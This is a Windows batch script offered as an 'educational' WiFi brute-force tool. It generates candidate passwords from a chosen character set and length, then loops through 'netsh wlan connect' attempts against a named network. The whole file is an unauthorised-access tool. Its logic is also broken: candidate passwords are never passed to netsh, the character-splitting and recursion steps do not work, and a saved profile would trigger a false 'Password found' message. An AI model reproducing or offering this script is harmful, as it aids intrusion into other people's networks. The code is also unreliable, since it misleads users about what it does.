@echo off
title WiFi Brute Force (Educational)
color 0A
setlocal enabledelayedexpansion

echo ============================================================
echo    WIFI BRUTE FORCE - EDUCATIONAL PURPOSES ONLY
echo ============================================================
echo.
echo [WARNING] Only use on networks you OWN!
echo.

set /p ssid="Enter network name: "

echo.
echo Choose character set:
echo   1. Numbers only (0-9)
echo   2. Small letters (a-z)
echo   3. Capital letters (A-Z)
echo   4. Small + Numbers
echo   5. Capital + Numbers
echo   6. All (Small + Capital + Numbers)
echo.
set /p char_choice="Choose (1-6): "

if "%char_choice%"=="1" set "chars=0123456789"
if "%char_choice%"=="2" set "chars=abcdefghijklmnopqrstuvwxyz"
if "%char_choice%"=="3" set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZ"
if "%char_choice%"=="4" set "chars=abcdefghijklmnopqrstuvwxyz0123456789"
if "%char_choice%"=="5" set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
if "%char_choice%"=="6" set "chars=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

set /p length="Enter password length (e.g., 4, 6): "

echo.
echo [INFO] Starting brute force on: %ssid%
echo [INFO] Character set: %chars%
echo [INFO] Length: %length%
echo.
echo ============================================================
echo Press Ctrl+C to stop at any time
echo ============================================================
echo.

:: Create temp file for password list
set "passfile=%temp%\passwords.txt"
echo > "%passfile%"

:: Generate passwords
call :generate "" 0

echo.
echo ============================================================
echo [INFO] Trying passwords from list...
echo.

for /f "usebackq delims=" %%p in ("%passfile%") do (
    echo Trying: %%p
    netsh wlan connect name="%ssid%" ssid="%ssid%" interface="Wi-Fi" >nul 2>&1
    timeout /t 2 >nul
    netsh wlan show interfaces | findstr "SSID" | findstr "%ssid%" >nul
    if !errorlevel! equ 0 (
        echo.
        echo ============================================================
        echo [SUCCESS] Password found: %%p
        echo ============================================================
        pause
        exit
    )
)

echo.
echo [FAILED] Password not found in generated list!
pause
exit

:generate
set "prefix=%~1"
set "pos=%~2"

if !pos! equ %length% (
    echo !prefix! >> "%passfile%"
    exit /b
)

set "remaining=%chars%"
:loop_char
if "%remaining%"=="" exit /b

for /f "tokens=1,* delims=" %%a in ("%remaining%") do (
    set "char=%%a"
    set "remaining=%%b"
    call :generate "!prefix!!char!" !pos! + 1
    goto loop_char
)